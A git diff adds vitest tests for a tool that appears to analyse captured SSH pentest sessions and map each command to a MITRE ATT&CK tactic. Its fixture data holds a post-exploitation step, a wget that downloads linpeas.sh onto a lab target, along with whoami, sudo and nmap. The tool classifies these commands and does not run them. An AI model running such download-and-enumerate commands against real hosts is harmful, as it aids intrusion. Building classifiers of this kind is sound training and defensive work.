@@ -1,11 +1,12 @@
 import { describe, it, expect } from "vitest";
 import { parseScriptInputLog } from "./parse";
-import { sshTargetOf, ingestSshSession } from "./ingest";
+import { sshTargetOf, ingestSshSession, sshSessionsFromDir } from "./ingest";
+import { finalizeLiveReport } from "../finalize";
 import { classifyCommand, isOnTarget } from "../pipeline/mitre";
 import { segmentEpisodes } from "../pipeline/segment";
 import { assembleReport } from "../pipeline/ingest";
 import type { RawCommand } from "../pipeline/types";
-import type { Session } from "../../types/report";
+import type { Session, WatcherReport } from "../../types/report";
 
 describe("parseScriptInputLog", () => {
   it("splits on Enter and trims", () => {
@@ -85,6 +86,48 @@ describe("end-to-end: ssh log → episodes carry post-exploitation tactics", () 
     expect(byBinary["whoami"]).toBe("TA0007"); // Discovery, not local noise
     expect(byBinary["sudo"]).toBe("TA0004"); // PrivEsc
     expect(byBinary["wget"]).toBe("TA0011"); // Ingress tool transfer
+  });
+});
+
+describe("sshSessionsFromDir", () => {
+  it("pairs .in transcripts with their .meta sidecars", () => {
+    const sessions = sshSessionsFromDir([
+      { name: "sess-1.in", content: "id\rwhoami\r" },
+      { name: "sess-1.meta", content: JSON.stringify({ target: "10.10.10.5", startedAtMs: 42 }) },
+    ]);
+    expect(sessions).toHaveLength(1);
+    expect(sessions[0]).toMatchObject({ target: "10.10.10.5", startedAtMs: 42, inputLog: "id\rwhoami\r" });
+  });
+
+  it("degrades gracefully when the meta sidecar is missing", () => {
+    const sessions = sshSessionsFromDir([{ name: "x.in", content: "id\r" }]);
+    expect(sessions[0].target).toBe("target"); // fallback label; still on-target via provenance
+  });
+
+  it("skips empty transcripts (e.g. one-shot ssh host 'cmd')", () => {
+    expect(sshSessionsFromDir([{ name: "x.in", content: "\r\n" }])).toHaveLength(0);
+  });
+});
+
+describe("finalizeLiveReport folds captured SSH sessions in", () => {
+  const base: WatcherReport = {
+    schema_version: "1.1",
+    session: { uuid: "u", started_at: new Date(0).toISOString(), ended_at: new Date(1000).toISOString(), target_scope: "Box", shell: "bash", source: "local_pty" },
+    episodes: [{ seq: 1, cmd: "nmap 10.10.10.5", binary: "nmap", duration_ms: 2000, gap_before_ms: 0, actor: "machine_bound", tactic: "TA0007" }],
+    phases: [],
+    golden_dag: [],
+    metrics: { efficiency_pct: 0, time_waster: { productive_ms: 0, detour_ms: 0, stuck_ms: 0, loop_ms: 0, t_active_ms: 0 }, stealth_score: 100, objective_coverage_pct: 0, technique_breadth: 0 },
+    coaching: { skill_radar: { recon: 0, web: 0, exploit: 0, privesc: 0, opsec: 0 }, next_steps: [] },
+    redaction_profile: "full",
+  };
+
+  it("appends on-target episodes and re-derives phases", () => {
+    const out = finalizeLiveReport(base, [{ inputLog: "id\rwget http://x/linpeas.sh\r", target: "10.10.10.5", startedAtMs: 5000 }]);
+    const onTarget = out.episodes.filter((e) => e.context_path === "host->ssh:10.10.10.5" && e.binary);
+    expect(onTarget.map((e) => e.binary)).toEqual(["id", "wget"]);
+    expect(onTarget.find((e) => e.binary === "wget")!.tactic).toBe("TA0011"); // ingress transfer on-target
+    // the phase map now includes a post-exploitation phase that wasn't there from local recon alone
+    expect(out.phases.some((p) => p.mitre_tactic === "TA0011")).toBe(true);
   });
 });
 
